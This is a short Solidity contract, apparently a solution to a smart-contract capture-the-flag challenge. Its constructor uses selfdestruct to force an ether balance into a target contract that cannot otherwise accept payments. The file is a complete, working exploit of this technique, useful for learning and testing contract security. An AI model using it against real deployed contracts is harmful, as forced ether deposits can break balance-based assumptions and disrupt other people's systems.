// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract ForceHack {
    constructor(address target) payable {
        require(msg.value > 0);
        address payable targetPayable = payable(target);

        // Transfer all ether balance to "target" address
        selfdestruct(targetPayable);
    }
}
